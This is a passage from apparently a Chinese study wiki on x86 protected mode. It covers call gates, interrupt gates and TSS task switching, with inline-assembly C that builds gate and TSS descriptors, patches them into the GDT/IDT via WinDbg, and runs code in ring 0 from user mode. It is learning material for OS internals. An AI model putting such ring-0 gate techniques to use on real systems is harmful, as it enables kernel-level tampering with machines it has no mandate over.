g执行call前执行call指令执行iretd指令做法2：使用无参调用门，然后修改堆栈分析测试代码构造的门描述符代码设计及过程分析执行结果调试下的堆栈分析这个是正常的调用门+用retf返回，调试看堆栈截的图（执行完pushad和pushfd指令后）我看到网上大多数做法都是将ESP和SS分别往高字节堆栈移动，然后加入EFLAGS。但是有个问题：就是会覆盖到原本高字节堆栈存的内容（0环的堆栈）。我觉得最好还是往低字节逐个移动，将堆栈空出位置，再存入eflags寄存器，只是这样移动的寄存器数量要多一些。那么我这里就用麻烦一点的这个做法。核心代码是处理堆栈的部分，写一个loop，逐个移动一共11个寄存器（8个通用+1个fd+2个），后放入eflags寄存器，然后恢复esp指针有个小细节没处理，每次loop会判断cx是否为0，eflags里的有几个标志位会变化。最后pushfd的值其实和一开始进0环的不一样，无所谓了。修改后的堆栈里有eflags，能用iretd返回就行了。要处理的话，事先加一个变量保存，然后再放到堆栈里。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &lt;stdio.h&gt;#include &lt;windows.h&gt;char CallGate[6] = &#123;0, 0, 0, 0, 0x48, 0&#125;;//8003f048 0040EC00`00081020DWORD dwH2GValue;//切换堆栈后执行的代码void __declspec(naked) R0Func() //00401020&#123; __asm &#123; //int 3 //windbg调试用 pushad pushfd mov eax,0x8003f00c //读取高2G的地址 mov ebx,[eax] mov dwH2GValue,ebx //处理堆栈 mov ecx,11L1: mov eax,[esp] mov [esp-0x4],eax add esp,0x4 //往高字节方向移动，准备移下一个 loop L1 pushfd //存入eflags寄存器 sub esp,11*0x4 //恢复栈顶指针 popfd popad //retf iretd &#125;&#125;int main()&#123; __asm &#123; call fword ptr ds:[CallGate]; //长调用，需要6个字节。F10步进，然后在windbg，u查看后面的指令，p单条指令执行 &#125; printf(&quot;Call gate successfully returned using iretd &quot;); printf(&quot;%x &quot;,dwH2GValue); return 0;&#125;0040EC00`000810201234567891011121314kd&gt; dq 8003f000 LA8003f000 00000000`00000000 00cf9b00`0000ffff8003f010 00cf9300`0000ffff 00cffb00`0000ffff8003f020 00cff300`0000ffff 80008b04`200020ab8003f030 ffc093df`f0000001 0040f300`00000fff8003f040 0000f200`0400ffff 00000000`00000000kd&gt; eq 8003f048 0040EC00`00081020kd&gt; dq 8003f000 LA8003f000 00000000`00000000 00cf9b00`0000ffff8003f010 00cf9300`0000ffff 00cffb00`0000ffff8003f020 00cff300`0000ffff 80008b04`200020ab8003f030 ffc093df`f0000001 0040f300`00000fff8003f040 0000f200`0400ffff 0040ec00`00081020kd&gt; g处理堆栈的过程示意图：因为是调用门，调试时看的在3环，0环，EFLAGS寄存器没有变化，所以放堆栈时直接pushfd了。但我写的loop会让eflags变，和刚进0环时的值不一样，这个细节我不处理了mark，疑问，直接执行能执行，调试单步最后回3环报错下一条指令是loop，执行p命令会走完循环。bp 0040103E，然后t进入循环里，p会走一次循环执行call执行前执行pushfd和pushad指令前执行pushfd和pushad指令后执行完第一次修改堆栈寄存器值返回地址（下一条指令）0040106FCS001BESP0012FF34SS0023寄存器值eflags202edi12ff80esi0ebp12ff80espee40ddd0ebx7ffde000edx380e08ecx0eaxcccccccc1234567891011kd&gt; u0040102f b90b000000 mov ecx,0Bh00401034 8b0424 mov eax,dword ptr [esp]00401037 894424fc mov dword ptr [esp-4],eax0040103b 83c404 add esp,40040103e e2f4 loop 0040103400401040 9c pushfd00401041 83ec2c sub esp,2Ch00401044 9d popfdkd&gt; bp 0040103ebreakpoint 0 redefined修改前：12345678ee40dda0 2f 10 40 00 08 00 00 00 /.@.....ee40dda8 02 02 00 00 02 02 00 00 ........ee40ddb0 80 ff 12 00 00 00 00 00 ........ee40ddb8 80 ff 12 00 d0 dd 40 ee ......@.ee40ddc0 00 40 fd 7f 08 0e 38 00 .@....8.ee40ddc8 00 00 00 00 cc cc cc cc ........ee40ddd0 6f 10 40 00 1b 00 00 00 o.@.....ee40ddd8 34 ff 12 00 23 00 00 00 4...#...执行完第一次loop：上面两行内容都变了（和我预期不一样）12345678ee40dda0 00 00 00 00 3e 10 40 00 ....&gt;.@.ee40dda8 08 00 00 00 92 02 00 00 ........ee40ddb0 80 ff 12 00 00 00 00 00 ........ee40ddb8 80 ff 12 00 d0 dd 40 ee ......@.ee40ddc0 00 40 fd 7f 08 0e 38 00 .@....8.ee40ddc8 00 00 00 00 cc cc cc cc ........ee40ddd0 6f 10 40 00 1b 00 00 00 o.@.....ee40ddd8 34 ff 12 00 23 00 00 00 4...#...第二次loop里：再输入t指令（执行 mov dword ptr [esp-4],eax），堆栈没变化再输入t指令（执行 add esp.0x4）时，堆栈上面很多都变化了这种情况下，最后弹栈eip变回的值是不正常的08 00 00 00，然后回到3环报错 中断门使用RETF返回 实现过程参考链接：https://www.cnblogs.com/Hookcc/p/12704089.html没法尽善尽美：将堆栈中的eflags赋值给EFL寄存器后，后面的代码执行时没法屏蔽中断了。直接动堆栈，不pushad和pushfd，整体堆栈也不上移，选择向下移动偷懒了，直接动堆栈，不pushad和pushfd。动堆栈也直接向低地址移动。构造中断门描述符测试代码代码分析运行结果堆栈分析构造的门描述符（DPL=3）：0040EE00`000810201dq 8003f400 L221eq 8003f500 0040EE00`0008102012345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;stdio.h&gt;#include &lt;windows.h&gt;BYTE IDTItem[8]=&#123;0&#125;;//切换堆栈后执行的代码void __declspec(naked) R0Func() //00401020 &#123; __asm &#123; //int 3 //让断点停在windbg，让我们分析下寄存器和堆栈 mov eax,0x8003f400 //读取高2G的地址，地址是IDT表基址 mov ebx,[eax] mov dword ptr ds:[IDTItem],ebx //IDT表第一个元素的低32位（小端序） mov ecx,[eax+0x4] mov dword ptr ds:[IDTItem+0x4],ecx //IDT表第一个元素的高32位（小端序） //处理堆栈部分 add esp,0x4*2 popfd //popfd后ESP指向esp3 mov eax,[esp] //移动esp3到eflages的位置 mov [esp-0x4],eax mov eax,[esp+0x4] //移动SS到ESP的位置 mov [esp],eax sub esp,0x4*3 //恢复ESP指针 retf &#125;&#125;int main()&#123; __asm &#123; int 0x20 //索引号32，8003f500 0040EE00`00081020 &#125; printf(&quot;%08x`%08x &quot;,*(PDWORD)((PBYTE)IDTItem+0x4),*(PDWORD)IDTItem);//处理成：按windbg的dq那样显示数据 getchar(); return 0;&#125;堆栈示意：1234567891011121314处理堆栈前： add esp,0x8： popfd后： ------------ ------------ ------------| EIP | &lt;----ESP | EIP | | EIP | ------------ ------------ ------------| CS | &lt;----ESP+0x4 | CS | | CS | ------------ ------------ ------------| EFLAGS | &lt;----ESP+0x8 | EFLAGS | &lt;----ESP | EFLAGS | &lt;----ESP-0x4 ------------ ------------ ------------| ESP | | ESP | &lt;----ESP+0x4 | ESP | &lt;----ESP ------------ ------------ ------------| SS | | SS | | SS | &lt;----ESP+0x4 ------------ ------------ ------------| | | | | | ------------ ------------ ------------核心代码：1234567891011121314151617181920212223__asm&#123; //int 3 //让断点停在windbg，让我们分析下寄存器和堆栈 mov eax,0x8003f400 //读取高2G的地址，地址是IDT表基址 mov ebx,[eax] mov dword ptr ds:[IDTItem],ebx //IDT表第一个元素的低32位（小端序） mov ecx,[eax+0x4] mov dword ptr ds:[IDTItem+0x4],ecx //IDT表第一个元素的高32位（小端序） //处理堆栈部分 add esp,0x4*2 popfd //popfd后ESP指向esp3 mov eax,[esp] //移动esp3到eflages的位置 mov [esp-0x4],eax mov eax,[esp+0x4] //移动SS到ESP的位置 mov [esp],eax sub esp,0x4*3 //恢复ESP指针 retf&#125;内联汇编里加上int 3，单步步入进windbg后才正常，不加的话会像这样：（我也不知道原因）执行中断前刚进0环执行retf前执行1add esp,8后堆栈内容又变了（非预期）所以执行retf前变成这样了，然后retf会出错。eip被赋了08 00 00 00中断里加了又一个中断int 3，就算一直单步执行，也回不到VC的"},{"title":"任务段","path":"/wiki/Protected_Mode/任务段.html","content":"要点回顾 在调用门、中断门与陷阱门中，一旦出现权限切换，那么就会有堆栈的切换。而且，由于CS的CPL发生改变，也导致了SS也必须要切换。 切换时，会有新的ESP和SS(CS是由中断门或者调用门指定)，这2个值从哪里来的呢? 答案:TSS (Task-state segment)，任务状态段. TSS的结构 TSS是一块内存，大小为104字节，内存结构如图。从下往上看，最下面那行是前4个字节。 Reserved的没法用，Intel不允许用。 Previous Task Link：指向前一个任务段的链接。 SS0、ESP0是0环的堆栈，SS1、ESP1是1环的堆栈，SS2、ESP2是2环的堆栈.虽然windows和linux都没使用1环和2环，但如果我们想用，是可以去1环，用1环的堆栈；去2环，用2环的堆栈。3环切3环，不换堆栈，所以没有ESP3，SS3。 像EDI、ESI、EBP、ESP、EBX、EDX、ECX、EAX、EFLAGS、EIP、CR3在发生任务切换时就是直接替换值。 但是段寄存器，如GS、FS、DS、SS、CS、ES、LDTR，发生任务切换时，比如GS，是用TSS-GS里存的16位充当段选择子，查GDT表，再填充GS的96位（忘了的话翻回去看《段描述符与段选择子》那一章）。 TSS里的LDT Segment Seletctor字段（LDT段描述符），也是存的段选择子，只不过用这个段选择子去查描述符时必须是LDT系统段，然后填充LDTR段寄存器，LDTR.base和LDTR.limit指示了LDT表的起始地址和大小。 这里贴图回忆下： 1个核1个GDT表。 LDT有多少个取决于有多少个任务，取决于有多少个TSS。1个TSS对应1个TSS表。 执行诸如这行指令，查的是IDT表 1mov ds,0x5c 0000 0000 0101 1100 Index：0000 0000 0101 1 TI：1，查LDT表 RPL：00 CPU如何知道GDT表的位置？查gdtr寄存器。 如何知道LDT表的位置？查ldtr段寄存器。 假设有100个任务，有100个LDT表。发生任务切换时，ldtr的值会换，gdtr不换（跟任务没关系）。在某个具体的时刻，ldtr有且仅有1个值，就找到了是100个LDT表中的哪个表。 只对单个任务有影响，跟别人没关系。所以叫局部表。 这些是CPU对于任务的设计想法，但windows和linux都没用LDT、TSS，自己实现了线程切换。 在16位的实模式下，因为段寄存器长度限制，所以要通过不同的段来区分不同的内存区域，段的概念很重要。 为了保持向下兼容，这种思想延续到32位。但段寄存器长度够长，寻址空间够，虽然可以给不同的base，分段，但没必要这样。windows除了fs，其他段寄存器base都设0，也就是平坦模式。没必要分那么多段，所以也没用LDT表了。 windows发生线程切换时直接存当前堆栈中，不用TSS，觉得太麻烦了。windows只用了TSS中的SS0和ESP0 开机时CPU自己会用TSS，从实模式开机，然后转到保护模式 TSS的作用 Intel的设计思想 Intel设计TSS的目的：实现“任务切换”。任务一切换，执行需要的环境就变了，即所有寄存器的值，需要保存供下一次切换到该任务的时候再换回去重新执行。 CPU没有进程和线程的概念，只有任务的概念。CPU的“任务”在操作系统方面就是指“线程”。所以我等下讲任务，你理解成线程。 抛开操作系统不说，单核CPU同时只能做一件事，因为CPU只有一套寄存器。但我还是想单核CPU同时做多个事情怎么办？分时。比如任务A跑着跑着，然后我将它的全部寄存器都存起来；然后去做任务B，做着做着，保存，再恢复做任务A。 所以，TSS存在的目的就是为了让一个CPU可以同时执行多个任务。 1个CPU只有1个TSS。 操作系统的设计思想 觉得TSS不够好，所以自己实现了一套任务切换（线程切换）（后面课程讲） TSS的意义就在于可以同时换掉一大堆寄存器。 不要一看到TSS就想到任务切换，想到TSS的作用就是一次性换掉大量寄存器，就行了，不要继续拓展联想。 从某个角度看，所有汇编指令要么改寄存器，要么改地址 jmp，改了eip jmp far，改了cs和eip call短调用，改了esp、eip call长调用，跨段不提权，改esp、eip、cs call长调用，跨段并提权，改esp、esip、cs、ss 调用门： 不提权：cs和eip 提权：ss、esp、cs、eip 中断门、陷阱门 不提权：cs、eflags、eip 提权：ss、esp、eflag、cs、eip 但这种方式每次改寄存器改得太少了，我想一次性换掉所有寄存器？ 用TSS TSS存在的目的：替换所有寄存器。 CPU如何找到TSS TSS是一个内存，不是寄存器（不在CPU中）。CPU通过TR寄存器来找到TSS。 段寄存器TR（TaskRegister）有96位，其中16位可见部分为选择子，可以找到GDT表中的一个段描述符，通过该描述符加载TR段寄存器中后80位。TR寄存器的Base指示了TSS表的位置。Limit指示了TSS表有多大。 123456789struct SegMent&#123; //可见 WORD Selector;//16位Selector //不可见 WORD Attributes;//16位Attributes DWORD Base;//32位Base DWORD Limit;//32位Limit&#125; TSS段描述符结构 任务段描述符是系统段中的一种，S=0。其他就不详细讲了。 Type里的B位： B位 含义 1 当前TSS段描述符已经加载到TR寄存器中 0 当前TSS段描述符没有加载到TR寄存器中 TR寄存器读写 加载TSS 将TSS段描述符加载到TR寄存器。 指令：LTR 说明： 用LTR指令去装载，只是改变TR寄存器的值（96位），并没有去修改到内存中TSS的值。 LTR指令只能在系统层使用。 加载后TSS段描述符的状态位（Type中的B位）会发生改变。 读TR寄存器 指令：STR 说明：如果用STR去读的话,只读TR的16位，也就是选择子部分。 关系辨析 TSS：一块104字节的内存 TR段寄存器：TR.base和TR.limit一起指示了TSS的起始地址和大小，TR的值来自于GDT表的TSS段描述符。当需要替换TSS时，CPU会通过TR寄存器去找这104个字节。 TSS段描述符：GDT表中段描述符的一种。 1个任务对应1个TSS段描述符。 实验：自己构造TSS实现任务切换 其实也可以从系统自身的TSS段描述符，找到系统目前的TSS，复制一份。但这里，这个实验，我们自己写一份TSS。 分析 我们自己找一块内存当作TSS用，CPU是通过TR寄存器来找到TSS的，所以我们要修改TR寄存器的值。而TR寄存器的值是来自于TSS段描述符，所以TSS段描述符也要我们自己构造。 注意：构造TSS段描述符时G位要为0，因为这个描述符指向的TSS是以字节为单位的。 修改TR寄存器 在Ring0我们可以通过LTR指令去修改TR寄存器 在Ring3我们可以通过CALL FAR或者JMP FAR指令来修改 用JMP去访问一个代码段的时候,改变的是CS和EIP:比如JMP 0x480x123456，如果0x48是代码段，执行后:CS–&gt;0x48 EIP–&gt;0x123456 用JMP去访间一个任务段的时候：如果0x48是TSS段描述符,先修改TR寄存器,再用TR.Base指向的TSS中的值修改当前的寄存器 注意： Ring0中用LTR指令，只改了TR寄存器，没改TSS JMP 任务段或CALL 任务段的方式，不仅改了TR寄存器，还用TSS改了寄存器 代码模板 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#include &lt;stdio.h&gt;#include &lt;Windows.h&gt;DWORD dwOK;DWORD dwESP;DWORD dwCS;void __declspec(naked) func()&#123; dwOK=1; __asm &#123; int 3; mov eax,esp; mov dwESP,eax; mov word ptr [dwCS],cs; //回去的代码自己写。因为jmp 代码段和call代码段回去的代码不同 &#125;&#125;int main()&#123; char stack[100]=&#123;0&#125;; //找了一个局部变量的地址当堆栈堆栈用 DWORD cr3=0; printf(&quot;input CR3: &quot;); scanf(&quot;%x&quot;,&amp;cr3); //执行该exe后，在WinDbg中用该指令获取：!process 0 0 //下一步构造TSS，注释标有*说明为必填值 DWORD tss[0x68]=&#123; //0x68，104字节 0x00000000, //link，上一个任务的link，在发生任务切换时CPU会自动填充 0x00000000, //esp0 0x00000000, //ss0 0x00000000, //esp1 0x00000000, //ss1 0x00000000, //esp2 0x00000000, //ss2 cr3, //cr3* (DWORD)func, //eip * 跳转的地址 0x00000000, //eflags 0x00000000, //eax 0x00000000, //ecx 0x00000000, //edx 0x00000000, //ebx ((DWORD)stack) + 100, //esp * 0x00000000, //ebp 0x00000000, //esi 0x00000000, //edi 0x00000023, //es * 0x00000008, //cs * 3环：0x1B 0x00000010, //ss * 3环：0x23 0x00000023, //ds * 0x00000030, //fs * 3环：0x3B 0x00000000, //gs 0x00000000, //ldt 0x20ac0000 //IO权限位图，VISTA之后不再用了，这是从现有的TSS结构体拷出来的 &#125;; char buffer[6];//构造任务段 *(DWORD*)(&amp;buffer[0])=0x12345678; *(WORD*)(&amp;buffer[4])=0x88; //这个目前是乱写的，要改 __asm &#123; call fword ptr [buffer]; &#125; printf(&quot;ok = %x ESP = %x CS = %x &quot;,dwOK,dwESP,dwCS); return 0;&#125; 变量tss大小0x68，即104字节。是自己构造的TSS，里面填上所有寄存器的值。 TSS可以使用数组，也可以VirtualAlloc，建议后者，因为白皮书说tss要在一个内存页或者连续的内存页。用数组蓝了的话重来一次，但实际过程中我用数组我没遇到过 必填的注释有*号，非必填的注释没。 link字段，当你一次性切换一堆寄存器时，这个地方存储的就是你上一次任务原来104字节的段选择子。当发生任务切换时，会由硬件CPU自动填充。 3组esp和ss，因为本次实验是3环进0环，没用到，所以都写0。 CR3的值（目前不解释，后面讲到页的知识在讲），在运行该exe后，使用windbg下断点，使用!process 0 0指令，找到该exe名称那栏，获得cr3的值。 eip是切换后，接着执行的代码地址。 gs寄存器，windows没有使用，永远是0. ldt永远是0。 cs、ss、fs代码目前写是跳0环后的值，如果是3环通过TSS跳3环，这三个的值改成注释的值。 es、ds无论3环还是0环，都是0x23。 tss最后一项，这个字段叫IO权限位图，Windows 2000之后不再使用了，但TSS结构体要有这个值。所以从现有的TSS结构体拷出来0x20ac0000直接贴在这。 stack是自己定义的一个变量，未来将它的内存拿来当堆栈使用。堆栈从高地址开始使用，所以tss数组里stack+了100 func函数里返回的代码没写，这取决于调用时是jmp还是call调用。这两种调用方式进来func，返回部门的代码不一样，自己做一下。 步骤： 构造TSS的104字节 准备好TSS段描述符，写到GDT表里 使用jmp/call 任务段，修改TR寄存器 后面文章内容通用部分：构造TSS段描述符Base指示了TSS表的位置（就是我们自己要切换到的TSS表的位置，就是程序中我们的tss数组，即tss数组的起始地址）。Limit指示了TSS表有多大（没有特殊设置就设置成0x68，也就是十进制的104，其实更大一些也没关系）。Base假设是0x0012FDE0。Base31:24 ：00G：0，以字节为单位00AVL：0Limit19:16：0P：1DPL：110Type：9，即1001。B位为0，表当前TSS段描述符没加载到TR寄存器中。Base23:16：12。程序输出打印的tss数组地址的一部分。Base Address 15:00：fde0。程序输出打印的tss数组地址的一部分。Segment Limit 15:00：0068。综上，构造的任务段段描述符是：0000E912`fde00068下划线部分是tss数组地址，我用代码输出到终端，就不用每次都调试查看123456789101112// Print the address of the tss array in hexadecimal formprintf(&quot;Address of the tss array: %p &quot;, tss);// Print the 1st (leftmost) hexadecimal digit, 2nd hexadecimal digit, and the low 16 bits of the tss array addressprintf(&quot;1st Hex Digit: %02x, 2nd Hex Digit: %02x, Low 16 bits: %04x &quot;, (DWORD)tss &gt;&gt; 28, ((DWORD)tss &gt;&gt; 16) &amp; 0x000000FF, (DWORD)tss &amp; 0x0000FFFF);printf(&quot;In WinDbg, modify your constructed Task Segment Descriptor in the GDT table using the following command: eq 8003f048 %02x00e9%02x`%04x0068 &quot;, (DWORD)tss &gt;&gt; 28, ((DWORD)tss &gt;&gt; 16) &amp; 0x000000FF, (WORD)tss);代码分析%02x 00e9 %02x%04x 0068%02x: 以十六进制输出，最少两位，不足补零。%04x: 以十六进制输出，最少四位，不足补零。(DWORD)tss &gt;&gt; 28得到tss地址的高两位十六进制数((DWORD)tss &gt;&gt; 16) &amp; 0x000000FF得到tss地址的高第3和第4位十六进制数(DWORD)tss &amp; 0x0000FFFF)或(WORD)tss)得到tss地址的低4位十六进制数测试程序运行示意： 调试提示如果多次运行，windbg用!process 0 0看时会有多个xxx.exe，用最后一行的CR3 call 任务段测试代码运行调试C89变量声明报错问题在ANSI C99之前，变量的声明必须放在其它语句之前，否则C99以前的编译器就会报错。我遇到的报错如：123456789101112C:\\CODE\\tss_array\\main.c(30) : error C2275: &#x27;DWORD&#x27; : illegal use of this type as an expressionc:\\program files\\microsoft visual studio\\vc98\\include\\windef.h(141) : see declaration of &#x27;DWORD&#x27;C:\\CODE\\tss_array\\main.c(30) : error C2146: syntax error : missing &#x27;;&#x27; before identifier &#x27;tss&#x27;C:\\CODE\\tss_array\\main.c(30) : error C2065: &#x27;tss&#x27; : undeclared identifierC:\\CODE\\tss_array\\main.c(30) : error C2109: subscript requires array or pointer typeC:\\CODE\\tss_array\\main.c(30) : error C2059: syntax error : &#x27;&#123;&#x27;C:\\CODE\\tss_array\\main.c(72) : error C2143: syntax error : missing &#x27;;&#x27; before &#x27;type&#x27;C:\\CODE\\tss_array\\main.c(73) : error C2065: &#x27;buffer&#x27; : undeclared identifierC:\\CODE\\tss_array\\main.c(73) : error C2109: subscript requires array or pointer typeC:\\CODE\\tss_array\\main.c(73) : error C2102: &#x27;&amp;&#x27; requires l-valueC:\\CODE\\tss_array\\main.c(74) : error C2109: subscript requires array or pointer typeC:\\CODE\\tss_array\\main.c(74) : error C2102: &#x27;&amp;&#x27; requires l-value1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889#include &lt;stdio.h&gt;#include &lt;windows.h&gt;DWORD dwOK;DWORD dwESP;DWORD dwCS;void __declspec(naked) func() &#123; dwOK=1; __asm &#123; //int 3 mov eax,esp mov dwESP,eax //存任务切换后的esp的值 mov word ptr [dwCS],cs //存任务切换后cs的值 iretd //call方式返回 &#125;&#125;int main()&#123; char buffer[6]; //构造任务段 char stack[100]=&#123;0&#125;; //找了一个局部变量的地址当堆栈堆栈用 DWORD cr3=0; //构造TSS，注释标有*说明为必填值 DWORD tss[0x68]=&#123; //0x68，104字节 0x00000000, //link，上一个任务的TR段选择子。在发生任务切换时CPU会自动填充 0x00000000, //esp0 0x00000000, //ss0 0x00000000, //esp1 0x00000000, //ss1 0x00000000, //esp2 0x00000000, //ss2 cr3, //cr3* (DWORD)func, //eip * 跳转的地址 0x00000000, //eflags 0x00000000, //eax 0x00000000, //ecx 0x00000000, //edx 0x00000000, //ebx ((DWORD)stack) + 100, //esp * 0x00000000, //ebp 0x00000000, //esi 0x00000000, //edi 0x00000023, //es * 0x00000008, //cs * 3环：0x1B 0x00000010, //ss * 3环：0x23 0x00000023, //ds * 0x00000030, //fs * 3环：0x3B 0x00000000, //gs 0x00000000, //ldt 0x20ac0000 //IO权限位图，VISTA之后不再用了，这是从现有的TSS结构体拷出来的 &#125;; //输出看((DWORD)stack) + 100的地址，后面用windbg看任务切换的esp作对比用 printf(&quot;Address of the ((DWORD)stack) + 100 :%p &quot;,((DWORD)stack) + 100); //修改GDT表 printf(&quot;Address of the tss array: %p &quot;, tss); // Print the 1st (leftmost) hexadecimal digit, 2nd hexadecimal digit, and the low 16 bits of the tss array address printf(&quot;1st Hex Digit: %02x, 2nd Hex Digit: %02x, Low 16 bits: %04x &quot;, (DWORD)tss &gt;&gt; 28, ((DWORD)tss &gt;&gt; 16) &amp; 0x000000FF, (DWORD)tss &amp; 0x0000FFFF); printf(&quot;In WinDbg, modify your constructed Task Segment Descriptor in the GDT table using the following command: eq 8003f048 %02x00e9%02x`%04x0068 &quot;, (DWORD)tss &gt;&gt; 28, ((DWORD)tss &gt;&gt; 16) &amp; 0x000000FF, (WORD)tss); //因为变量声明顺序的问题，输入cr3的语句在这里。然后再赋给tss数组里的cr3字段 printf(&quot;After running this executable, execute !process 0 0 in WinDbg, copy the value of DirBase for the TSS.exe process, and input it below. CR3: &quot;); scanf(&quot;%x&quot;,&amp;cr3); //执行该exe后，在WinDbg中用该指令获取：!process 0 0 tss[7]=cr3; *(DWORD*)(&amp;buffer[0])=0x12345678; *(WORD*)(&amp;buffer[4])=0x48; //段选择子0x48，拆完索引到的是8003f048 __asm &#123; call fword ptr [buffer]; &#125; printf(&quot;ok = %x ESP = %x CS = %x &quot;,dwOK,dwESP,dwCS); return 0;&#125;修改的是GDT表，8003f048对应的段选择子是0x48，所以call的CS是0x48执行exe，根据终端输出，windbg下break，修改GDT表使用!process 0 0查看该exe的DirBase，输入到终端12345678910111213kd&gt; dq 8003f000 LA8003f000 00000000`00000000 00cf9b00`0000ffff8003f010 00cf9300`0000ffff 00cffb00`0000ffff8003f020 00cff300`0000ffff 80008b04`200020ab8003f030 ffc093df`f0000001 0040f300`00000fff8003f040 0000f200`0400ffff 00000000`00000000kd&gt; eq 8003f048 0000e912`fd700068kd&gt; dq 8003f000 LA8003f000 00000000`00000000 00cf9b00`0000ffff8003f010 00cf9300`0000ffff 00cffb00`0000ffff8003f020 00cff300`0000ffff 80008b04`200020ab8003f030 ffc093df`f0000001 0040f300`00000fff8003f040 0000f200`0400ffff 0000e912`fd700068运行成功，执行过程没遇到错误直接加int 3在int 3后将NT位复原int 3 后恢复原来efl的值1234567891011121314void __declspec(naked) func() &#123; dwOK=1; __asm &#123;+ int 3 mov eax,esp mov dwESP,eax //存任务切换后的esp的值 mov word ptr [dwCS],cs //存任务切换后cs的值 iretd //call方式返回 &#125;&#125;然后执行，因为int 3，所以会断在windbg。可以看到寄存器都切换了可以看到，除了efl是4002，不是我设的0。其他都修改了。因为跳到了func执行指令，所以eip是被修改为我设的值。esp是设定的stack+100，终端有输出，可以对应到。注意efl，现在是0100 0000 0000 0010，第14位，NT位为1。然后注意下，如果输入指令p单步执行，会一直busy输入指令g，如果能回到VC，就没问题。但是输入指令g后会蓝屏为什么？int 3究竟做了什么导致了蓝屏原因与EFLAGS的嵌套任务标志NT（Nested Task）有关，它是用来控制中断返回指令IRET的执行。NT的值含义0用堆栈中保存的值恢复SS、ESP、EFLAGS、CS和EIP，执行常规的中断返回操作1通过任务转换实现中断返回efl第14位，NT位无论任何时候处理器碰到iret指令，都要检查NT位，如果此位是 0，表明是一般的中断过程，按一般的中断返回处理，即，中断返回是任务内的（中断处理过程虽然属于操作系统，但属于任务的全局空间）；如果此位是 1，则表明当前任务之所以能够正在执行，是因为中断了别的任务。因此，应当返回原先被中断的任务继续执行。这段话作了拓展，需要未来继续学习，这里浅浅看下就行。参考连接：《x86 汇编语言：从实模式到保护模式（第2版）》读书笔记（第 12-20 章）没加int 3时，call 任务段进来，会将NT位置1。返回时iretd，此时NT位为1，就回去找前一个任务的指针（TSS里的Previous Task Link字段）。而执行int 3后，终端指令将NT位置0了，返回时iretd，此时NT位为0，就回去从堆栈找值弹栈返回，导致蓝屏。所以：int 3改变了NT位标识，我们可以在int 3之后再重新将NT位复原，这样也是可以正确返回的。但我还看到一种说法是因为fs变了，改fs也能正常返回。但我试了下这个说法博客贴的代码，发现起作用的不是fs的原因，这个在第二种方式细讲。参考链接：https://www.braveenough.cn/2021/12/15/保护模式/#toc-heading-58任务段章核心代码：1234567891011121314151617181920212223void __declspec(naked) func() &#123; dwOK=1; __asm &#123; int 3 //调用int 3后将NT位置1 pushfd pop eax or eax,0x4000 //or或。0000 0000 0000 0000 0100 0000 0000 0000 //0x4000 push eax popfd mov eax,esp mov dwESP,eax //存任务切换后的esp的值 mov word ptr [dwCS],cs //存任务切换后cs的值 iretd //call方式返回 &#125;&#125;断在windbg后，输入指令g，能回到3环。int 3在windbg中断下后，调试，可以看到efl由4002变成了2，NT位由1到0了。然后我们的代码将NT位置1，efl又变成4002。但是最后当下一条指令是iretd时，输入指令p或指令g都会蓝屏，这里我不懂了。但是如果int 3一断进来，然后输入g，是能回到3环的。参考链接：https://blog.csdn.net/Kwansy/article/details/108890586上面链接博客里的代码是这样的：123456789101112131415161718192021222324// 任务切换后的EIPvoid __declspec(naked) R0Func()&#123;\t__asm\t&#123; pushad pushfd push fs int 3 // int 3 会修改FS pop fs mov eax,1 mov dword ptr ds:[dwOk],eax mov eax,esp mov dword ptr ds:[dwESP],eax mov ax,cs mov word ptr ds:[dwCS],ax popfd popad iretd\t&#125;&#125;实际上起作用能返回的原因是int 3前面的pushfd和之后的popfd我试了只有成对的push fs和pop fs，是没法返回的，代码如下：12345678910111213141516171819void __declspec(naked) func() &#123; dwOK=1; __asm &#123; //手动保存int 3前fs的值 push fs int 3 pop fs mov eax,esp mov dwESP,eax //存任务切换后的esp的值 mov word ptr [dwCS],cs //存任务切换后cs的值 iretd //call方式返回 &#125;&#125;试了仅有成对的pushfd和popfd，这样是可以返回的1234567891011121314151617181920212223void __declspec(naked) func() &#123; dwOK=1; __asm &#123; //pushad pushfd //手动保存int 3前fs的值 //push fs int 3 //pop fs mov eax,esp mov dwESP,eax //存任务切换后的esp的值 mov word ptr [dwCS],cs //存任务切换后cs的值 popfd //popad iretd //call方式返回 &#125;&#125;所以，参考链接博客里的代码实际起作用的是pushfd和popfd，而不是fs的原因。本质就是在int 3前，保存efl的值，int 3后恢复efl的值，与fs无关。而且我在windbg里调试，int 3前后fs的值没变，一直是0x30成功返回的截图： jmp 任务段分析及代码运行调试使用jmp far进行任务切换，TSS段中的Previous Task Link不会填充旧的TR，而且NT位不会置1。那就没法通过TSS段中的Previous Task Link返回上一个任务，堆栈也是空的。所以我们要自己手动保存旧的Previous Task Link，也就是TR寄存器，切换到新任务后，再JMP FAR回旧任务。用STR指令来读TR寄存器的16位核心代码：1BYTE PrevTR[6];12345678__asm&#123; //切换前保存旧TR str ax lea edi,[PrevTR+4] mov [edi],ax&#125;完整代码：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495#include &lt;stdio.h&gt;#include &lt;windows.h&gt;DWORD dwOK;DWORD dwESP;DWORD dwCS;BYTE PrevTR[6];void __declspec(naked) func() &#123; dwOK=1; __asm &#123; mov eax,esp mov dwESP,eax //存任务切换后的esp的值 mov word ptr [dwCS],cs //存任务切换后cs的值 jmp fword ptr ds:[PrevTR] //jmp方式返回 &#125;&#125;int main()&#123; char buffer[6]; //构造任务段 char stack[100]=&#123;0&#125;; //找了一个局部变量的地址当堆栈堆栈用 DWORD cr3=0; //构造TSS，注释标有*说明为必填值 DWORD tss[0x68]=&#123; //0x68，104字节 0x00000000, //link，上一个任务的TR段选择子。在发生任务切换时CPU会自动填充 0x00000000, //esp0 0x00000000, //ss0 0x00000000, //esp1 0x00000000, //ss1 0x00000000, //esp2 0x00000000, //ss2 cr3, //cr3* (DWORD)func, //eip * 跳转的地址 0x00000000, //eflags 0x00000000, //eax 0x00000000, //ecx 0x00000000, //edx 0x00000000, //ebx ((DWORD)stack) + 100, //esp * 0x00000000, //ebp 0x00000000, //esi 0x00000000, //edi 0x00000023, //es * 0x00000008, //cs * 3环：0x1B 